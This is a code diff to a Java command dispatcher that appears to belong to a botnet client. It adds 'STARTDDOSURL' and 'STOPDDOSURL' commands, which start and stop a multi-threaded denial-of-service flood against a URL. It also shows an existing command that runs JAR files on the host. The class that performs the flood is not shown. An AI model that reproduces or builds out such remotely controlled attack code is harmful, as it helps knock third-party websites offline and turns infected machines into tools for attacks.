@@ -1,5 +1,7 @@
 package client;
 
+import static botlogic.Bot.closeSocketConnection;
+
 /**
  * Created by kubehe on 30-04-2017.
  */
@@ -33,8 +35,29 @@ public class ActionFactory {
                 return new RunJarFileAction(jarCommands);
             }
         }
+        else if(commandWithArgs[0].equalsIgnoreCase("STARTDDOSURL"))
+        {
+            if(commandWithArgs.length == 3)
+            {
+            	int numOfThreads;
+            	try {
+            		numOfThreads = Integer.parseInt(commandWithArgs[2]);
+            	} catch (Exception e) {
+            		throw e;
+            	}
+                return new DDOSURLAction(commandWithArgs[1], numOfThreads);
+            }
+        }
+        else if(commandWithArgs[0].equalsIgnoreCase("STOPDDOSURL"))
+        {
+            if(commandWithArgs.length == 1)
+            {
+                return new DDOSURLAction();
+            }
+        }
         else if(commandWithArgs[0].equalsIgnoreCase("DIE"))
         {
+            closeSocketConnection();
             System.exit(0);
         }
         return null;
